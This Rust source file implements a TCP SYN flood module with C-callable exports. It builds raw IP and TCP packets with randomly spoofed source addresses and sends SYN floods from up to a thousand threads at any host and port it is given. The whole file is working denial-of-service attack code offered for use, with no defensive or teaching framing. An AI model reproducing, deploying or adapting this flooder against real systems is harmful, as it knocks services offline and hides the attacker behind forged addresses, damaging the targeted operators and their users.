// TCP SYN Flood module - Rust implementation with extern "C" FFI
// Constructs raw IP+TCP headers with spoofed source IPs and sends SYN packets.

use rand::Rng;
use socket2::{Domain, Protocol, Socket, Type};
use std::ffi::{CStr, CString};
use std::net::{Ipv4Addr, SocketAddrV4, ToSocketAddrs};
use std::os::raw::{c_char, c_int, c_void};
use std::sync::atomic::{AtomicBool, AtomicI64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// Stats returned to C/C++ caller
#[repr(C)]
pub struct TcpSynStats {
    pub packets_sent: i64,
    pub start_time: f64,
    pub end_time: f64,
}

/// Opaque context passed across FFI boundary
pub struct TcpSynCtx {
    target_ip: Ipv4Addr,
    port: u16,
    duration_secs: u32,
    num_threads: u32,
    stop_flag: Arc<AtomicBool>,
    packets_sent: Arc<AtomicI64>,
    callback: Option<extern "C" fn(*const c_char)>,
}

type LogCallback = extern "C" fn(*const c_char);

fn log_message(cb: Option<LogCallback>, msg: &str) {
    if let Some(callback) = cb {
        if let Ok(cmsg) = CString::new(msg) {
            callback(cmsg.as_ptr());
        }
    }
}

/// RFC 1071 internet checksum
fn internet_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    let len = data.len();

    while i + 1 < len {
        let word = ((data[i] as u32) << 8) | (data[i + 1] as u32);
        sum = sum.wrapping_add(word);
        i += 2;
    }

    // If odd number of bytes, pad with zero
    if i < len {
        sum = sum.wrapping_add((data[i] as u32) << 8);
    }

    // Fold 32-bit sum into 16-bit
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !sum as u16
}

/// Build an IP header (20 bytes, no options)
fn build_ip_header(src_ip: Ipv4Addr, dst_ip: Ipv4Addr, total_len: u16, id: u16) -> [u8; 20] {
    let mut hdr = [0u8; 20];

    // Version (4) + IHL (5) = 0x45
    hdr[0] = 0x45;
    // DSCP / ECN
    hdr[1] = 0x00;
    // Total length
    hdr[2] = (total_len >> 8) as u8;
    hdr[3] = (total_len & 0xFF) as u8;
    // Identification
    hdr[4] = (id >> 8) as u8;
    hdr[5] = (id & 0xFF) as u8;
    // Flags + Fragment offset (Don't Fragment)
    hdr[6] = 0x40;
    hdr[7] = 0x00;
    // TTL
    hdr[8] = 64;
    // Protocol: TCP = 6
    hdr[9] = 6;
    // Header checksum (initially 0, computed below)
    hdr[10] = 0;
    hdr[11] = 0;
    // Source IP
    let src = src_ip.octets();
    hdr[12] = src[0];
    hdr[13] = src[1];
    hdr[14] = src[2];
    hdr[15] = src[3];
    // Destination IP
    let dst = dst_ip.octets();
    hdr[16] = dst[0];
    hdr[17] = dst[1];
    hdr[18] = dst[2];
    hdr[19] = dst[3];

    // Compute IP header checksum
    let cksum = internet_checksum(&hdr);
    hdr[10] = (cksum >> 8) as u8;
    hdr[11] = (cksum & 0xFF) as u8;

    hdr
}

/// Build a TCP SYN header (20 bytes, no options) with pseudo-header checksum
fn build_tcp_syn_header(
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    seq_num: u32,
) -> [u8; 20] {
    let mut tcp = [0u8; 20];

    // Source port
    tcp[0] = (src_port >> 8) as u8;
    tcp[1] = (src_port & 0xFF) as u8;
    // Destination port
    tcp[2] = (dst_port >> 8) as u8;
    tcp[3] = (dst_port & 0xFF) as u8;
    // Sequence number
    tcp[4] = (seq_num >> 24) as u8;
    tcp[5] = (seq_num >> 16) as u8;
    tcp[6] = (seq_num >> 8) as u8;
    tcp[7] = (seq_num & 0xFF) as u8;
    // Acknowledgment number
    tcp[8] = 0;
    tcp[9] = 0;
    tcp[10] = 0;
    tcp[11] = 0;
    // Data offset (5 * 4 = 20 bytes) = 0x50, reserved bits
    tcp[12] = 0x50;
    // Flags: SYN = 0x02
    tcp[13] = 0x02;
    // Window size
    tcp[14] = 0xFF;
    tcp[15] = 0xFF;
    // Checksum (initially 0)
    tcp[16] = 0;
    tcp[17] = 0;
    // Urgent pointer
    tcp[18] = 0;
    tcp[19] = 0;

    // Build TCP pseudo-header for checksum:
    // src_ip (4) + dst_ip (4) + reserved (1) + protocol (1) + tcp_length (2) + tcp_header (20)
    let tcp_len: u16 = 20;
    let mut pseudo = Vec::with_capacity(32);
    pseudo.extend_from_slice(&src_ip.octets());
    pseudo.extend_from_slice(&dst_ip.octets());
    pseudo.push(0); // reserved
    pseudo.push(6); // protocol TCP
    pseudo.push((tcp_len >> 8) as u8);
    pseudo.push((tcp_len & 0xFF) as u8);
    pseudo.extend_from_slice(&tcp);

    let cksum = internet_checksum(&pseudo);
    tcp[16] = (cksum >> 8) as u8;
    tcp[17] = (cksum & 0xFF) as u8;

    tcp
}

fn generate_random_ip(rng: &mut impl Rng) -> Ipv4Addr {
    // Avoid reserved ranges: generate IPs in non-reserved space
    loop {
        let a: u8 = rng.gen_range(1..=254);
        let b: u8 = rng.gen();
        let c: u8 = rng.gen();
        let d: u8 = rng.gen_range(1..=254);

        // Skip obvious reserved ranges
        if a == 10 || a == 127 || a == 0 {
            continue;
        }
        if a == 172 && (16..=31).contains(&b) {
            continue;
        }
        if a == 192 && b == 168 {
            continue;
        }
        return Ipv4Addr::new(a, b, c, d);
    }
}

fn resolve_target(host: &str) -> Option<Ipv4Addr> {
    // Try parsing as IP first
    if let Ok(ip) = host.parse::<Ipv4Addr>() {
        return Some(ip);
    }
    // DNS resolution
    let addr_str = format!("{}:0", host);
    if let Ok(mut addrs) = addr_str.to_socket_addrs() {
        for addr in addrs {
            if let std::net::SocketAddr::V4(v4) = addr {
                return Some(*v4.ip());
            }
        }
    }
    None
}

fn worker_thread(
    target_ip: Ipv4Addr,
    port: u16,
    duration: Duration,
    stop_flag: Arc<AtomicBool>,
    packets_sent: Arc<AtomicI64>,
    callback: Option<LogCallback>,
    thread_id: u32,
) {
    let mut rng = rand::thread_rng();

    // Create raw socket with IP_HDRINCL
    let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6))) {
        Ok(s) => s,
        Err(e) => {
            log_message(
                callback,
                &format!("[TCP SYN] Thread {} failed to create raw socket: {}", thread_id, e),
            );
            return;
        }
    };

    // Set IP_HDRINCL so we supply our own IP header
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::io::AsRawSocket;
        unsafe {
            let one: i32 = 1;
            let raw = socket.as_raw_socket() as usize;
            // IP_HDRINCL = 2, IPPROTO_IP = 0
            let ret = libc_compat_setsockopt(
                raw,
                0,
                2,
                &one as *const i32 as *const u8,
                std::mem::size_of::<i32>() as i32,
            );
            if ret != 0 {
                log_message(callback, &format!("[TCP SYN] Thread {} IP_HDRINCL failed", thread_id));
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        use std::os::unix::io::AsRawFd;
        unsafe {
            let one: libc::c_int = 1;
            libc::setsockopt(
                socket.as_raw_fd(),
                libc::IPPROTO_IP,
                libc::IP_HDRINCL,
                &one as *const libc::c_int as *const libc::c_void,
                std::mem::size_of::<libc::c_int>() as libc::socklen_t,
            );
        }
    }

    let start = Instant::now();

    while !stop_flag.load(Ordering::Relaxed) && start.elapsed() < duration {
        let src_ip = generate_random_ip(&mut rng);
        let src_port: u16 = rng.gen_range(1024..=65535);
        let seq_num: u32 = rng.gen();
        let ip_id: u16 = rng.gen();

        let total_len: u16 = 40; // 20 IP + 20 TCP
        let ip_hdr = build_ip_header(src_ip, target_ip, total_len, ip_id);
        let tcp_hdr = build_tcp_syn_header(src_ip, target_ip, src_port, port, seq_num);

        let mut packet = [0u8; 40];
        packet[..20].copy_from_slice(&ip_hdr);
        packet[20..40].copy_from_slice(&tcp_hdr);

        let dest = SocketAddrV4::new(target_ip, port);
        let dest_addr = socket2::SockAddr::from(dest);

        match socket.send_to(&packet, &dest_addr) {
            Ok(_) => {
                packets_sent.fetch_add(1, Ordering::Relaxed);
            }
            Err(_) => {
                // Silently continue - raw socket sends may fail without admin privileges
            }
        }
    }
}

// On Windows we need a minimal setsockopt binding
#[cfg(target_os = "windows")]
extern "system" {
    fn setsockopt(
        s: usize,
        level: i32,
        optname: i32,
        optval: *const u8,
        optlen: i32,
    ) -> i32;
}

#[cfg(target_os = "windows")]
unsafe fn libc_compat_setsockopt(
    s: usize,
    level: i32,
    optname: i32,
    optval: *const u8,
    optlen: i32,
) -> i32 {
    setsockopt(s, level, optname, optval, optlen)
}

fn unix_time_now() -> f64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs_f64()
}

// ============================================================
// FFI exports
// ============================================================

/// Initialize TCP SYN flood context
#[no_mangle]
pub extern "C" fn tcp_syn_init(
    target: *const c_char,
    duration: c_int,
    threads: c_int,
    port: c_int,
    callback: extern "C" fn(*const c_char),
) -> *mut TcpSynCtx {
    if target.is_null() {
        return std::ptr::null_mut();
    }

    let target_str = unsafe { CStr::from_ptr(target) }
        .to_str()
        .unwrap_or("");

    let target_ip = match resolve_target(target_str) {
        Some(ip) => ip,
        None => {
            log_message(Some(callback), &format!("[TCP SYN] Failed to resolve target: {}", target_str));
            return std::ptr::null_mut();
        }
    };

    let dur = if duration > 0 {
        duration.min(300) as u32
    } else {
        30
    };
    let thr = if threads > 0 {
        threads.min(1000) as u32
    } else {
        100
    };
    let p = if port > 0 { port as u16 } else { 80 };

    let ctx = Box::new(TcpSynCtx {
        target_ip,
        port: p,
        duration_secs: dur,
        num_threads: thr,
        stop_flag: Arc::new(AtomicBool::new(false)),
        packets_sent: Arc::new(AtomicI64::new(0)),
        callback: Some(callback),
    });

    log_message(
        Some(callback),
        &format!(
            "[TCP SYN] Initialized: {} threads, {}s, target {}:{}",
            thr, dur, target_ip, p
        ),
    );

    Box::into_raw(ctx)
}

/// Run TCP SYN flood (blocking), returns stats
#[no_mangle]
pub extern "C" fn tcp_syn_run(ctx: *mut TcpSynCtx) -> TcpSynStats {
    let empty = TcpSynStats {
        packets_sent: 0,
        start_time: 0.0,
        end_time: 0.0,
    };
    if ctx.is_null() {
        return empty;
    }

    let ctx_ref = unsafe { &*ctx };

    log_message(
        ctx_ref.callback,
        &format!(
            "[TCP SYN] Starting {} threads for {}s against {}:{}",
            ctx_ref.num_threads, ctx_ref.duration_secs, ctx_ref.target_ip, ctx_ref.port
        ),
    );

    let start_time = unix_time_now();
    let duration = Duration::from_secs(ctx_ref.duration_secs as u64);

    let mut handles = Vec::with_capacity(ctx_ref.num_threads as usize);

    for i in 0..ctx_ref.num_threads {
        let target_ip = ctx_ref.target_ip;
        let port = ctx_ref.port;
        let stop_flag = Arc::clone(&ctx_ref.stop_flag);
        let packets_sent = Arc::clone(&ctx_ref.packets_sent);
        let callback = ctx_ref.callback;

        let handle = thread::spawn(move || {
            worker_thread(target_ip, port, duration, stop_flag, packets_sent, callback, i);
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.join();
    }

    let end_time = unix_time_now();

    let total = ctx_ref.packets_sent.load(Ordering::Relaxed);
    log_message(
        ctx_ref.callback,
        &format!("[TCP SYN] Finished: {} packets sent", total),
    );

    TcpSynStats {
        packets_sent: total,
        start_time,
        end_time,
    }
}

/// Signal stop
#[no_mangle]
pub extern "C" fn tcp_syn_stop(ctx: *mut TcpSynCtx) {
    if !ctx.is_null() {
        let ctx_ref = unsafe { &*ctx };
        ctx_ref.stop_flag.store(true, Ordering::Relaxed);
    }
}

/// Free context
#[no_mangle]
pub extern "C" fn tcp_syn_destroy(ctx: *mut TcpSynCtx) {
    if !ctx.is_null() {
        unsafe {
            drop(Box::from_raw(ctx));
        }
    }
}
